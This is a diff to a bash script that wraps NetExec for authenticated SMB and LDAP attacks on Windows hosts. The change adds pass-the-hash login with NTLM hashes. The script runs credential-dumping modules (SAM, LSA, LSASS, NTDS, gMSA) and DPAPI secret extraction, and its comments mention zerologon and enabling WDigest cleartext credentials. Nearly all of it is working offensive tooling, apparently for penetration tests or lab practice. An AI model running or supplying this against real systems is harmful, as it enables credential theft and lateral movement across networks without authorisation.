@@ -4,20 +4,21 @@
 #
 # Description:
 #   Perform authenticated SMB/LDAP enumeration and common NetExec modules.
-#   Supports both local and domain authentication.
+#   Supports both local and domain authentication with password or hash.
 #
 # Usage:
-#   ./auth_smb.sh -t <IP> -u <USER> -p <PASS> [-d <DOMAIN>]
+#   ./auth_smb.sh -t <IP> -u <USER> [-p <PASS> | -H <HASH>] [-d <DOMAIN>]
 #
 # Arguments:
 #   -t <IP>      Target host (IP or hostname)
 #   -u <USER>    Username (local user or domain user)
 #   -p <PASS>    Password (quote if it contains special chars)
+#   -H <HASH>    NTLM hash (instead of password)
 #   -d <DOMAIN>  Optional domain name. If given, domain auth is used.
 #
 # Auth modes:
-#   - Domain mode: uses -d <DOMAIN> -u <USER> -p <PASS>
-#   - Local mode:  uses --local-auth -u <USER> -p <PASS>
+#   - Domain mode: uses -d <DOMAIN> -u <USER> -p <PASS> (or -H <HASH>)
+#   - Local mode:  uses --local-auth -u <USER> -p <PASS> (or -H <HASH>)
 #
 # What it does:
 #   1) Runs SMB enumeration with common flags:
@@ -41,17 +42,20 @@
 #       nxc smb <IP> <auth> -M zerologon   # (lab use only)
 set -euo pipefail
 
-IP=""; USER=""; PASS=""; DOMAIN=""
+IP=""; USER=""; PASS=""; HASH=""; DOMAIN=""
 while [[ $# -gt 0 ]]; do
   case "$1" in
     -t) IP="$2"; shift 2 ;;
     -u) USER="$2"; shift 2 ;;
     -p) PASS="$2"; shift 2 ;;
+    -H) HASH="$2"; shift 2 ;;
     -d) DOMAIN="$2"; shift 2 ;;
-    *) echo "Usage: $0 -t <IP> -u <USER> -p <PASS> [-d <DOMAIN>]"; exit 1 ;;
+    *) echo "Usage: $0 -t <IP> -u <USER> [-p <PASS> | -H <HASH>] [-d <DOMAIN>]"; exit 1 ;;
   esac
 done
-[[ -z "$IP" || -z "$USER" || -z "$PASS" ]] && { echo "Missing -t/-u/-p"; exit 1; }
+[[ -z "$IP" || -z "$USER" ]] && { echo "Missing -t/-u"; exit 1; }
+[[ -z "$PASS" && -z "$HASH" ]] && { echo "Must provide either -p <PASS> or -H <HASH>"; exit 1; }
+[[ -n "$PASS" && -n "$HASH" ]] && { echo "Cannot use both -p and -H"; exit 1; }
 command -v nxc >/dev/null || { echo "nxc not in PATH"; exit 1; }
 
 log(){ echo -e "\n==== $* ====\n"; }
@@ -59,12 +63,20 @@ log(){ echo -e "\n==== $* ====\n"; }
 # Auth mode
 if [[ -n "$DOMAIN" ]]; then
   MODE="domain"
-  BASE=(-d "$DOMAIN" -u "$USER" -p "$PASS")
+  if [[ -n "$HASH" ]]; then
+    BASE=(-d "$DOMAIN" -u "$USER" -H "$HASH")
+  else
+    BASE=(-d "$DOMAIN" -u "$USER" -p "$PASS")
+  fi
 else
   MODE="local"
-  BASE=(--local-auth -u "$USER" -p "$PASS")
+  if [[ -n "$HASH" ]]; then
+    BASE=(--local-auth -u "$USER" -H "$HASH")
+  else
+    BASE=(--local-auth -u "$USER" -p "$PASS")
+  fi
 fi
-log "Auth mode: $MODE"
+log "Auth mode: $MODE ($([ -n "$HASH" ] && echo "hash" || echo "password"))"
 
 ## 0) NMAP
 log "nmap safe SMB scripts"
@@ -96,7 +108,11 @@ done
 ## 1b) LDAP recon (only when domain auth)
 if [[ "$MODE" == "domain" ]]; then
   log "LDAP: --groups"
-  nxc ldap "$IP" -d "$DOMAIN" -u "$USER" -p "$PASS" --groups || true
+  if [[ -n "$HASH" ]]; then
+    nxc ldap "$IP" -d "$DOMAIN" -u "$USER" -H "$HASH" --groups || true
+  else
+    nxc ldap "$IP" -d "$DOMAIN" -u "$USER" -p "$PASS" --groups || true
+  fi
 else
   log "Skip LDAP (needs domain auth)"
 fi
@@ -111,7 +127,11 @@ nxc smb "$IP" "${BASE[@]}" --dpapi nosystem || true
 
 if [[ "$MODE" == "local" ]]; then
   log "DPAPI nosystem (explicit local-auth)"
-  nxc smb "$IP" --local-auth -u "$USER" -p "$PASS" --dpapi nosystem || true
+  if [[ -n "$HASH" ]]; then
+    nxc smb "$IP" --local-auth -u "$USER" -H "$HASH" --dpapi nosystem || true
+  else
+    nxc smb "$IP" --local-auth -u "$USER" -p "$PASS" --dpapi nosystem || true
+  fi
 else
   log "Skip DPAPI local-auth variant (domain mode)"
 fi
@@ -124,7 +144,11 @@ LOCAL_ADMIN_MODULES=(sam lsa lsass ntds gmsa)
 if [[ "$MODE" == "local" ]]; then
   for m in "${LOCAL_ADMIN_MODULES[@]}"; do
     log "Module (local-admin): $m"
-    nxc smb "$IP" --local-auth -u "$USER" -p "$PASS" -M "$m" || true
+    if [[ -n "$HASH" ]]; then
+      nxc smb "$IP" --local-auth -u "$USER" -H "$HASH" -M "$m" || true
+    else
+      nxc smb "$IP" --local-auth -u "$USER" -p "$PASS" -M "$m" || true
+    fi
   done
 else
   for m in "${MODULES[@]}"; do
@@ -139,6 +163,7 @@ log "Done"
 log "Tips & Hints"
 cat <<'EOT'
 - Domain mode is used when -d <DOMAIN> is provided; otherwise the script uses --local-auth.
+- Use -p for password authentication or -H for NTLM hash authentication (pass-the-hash).
 - LDAP --groups runs only in domain mode.
 - Extra modules you can run manually if needed:
     * WDigest (enable cleartext creds in LSASS):
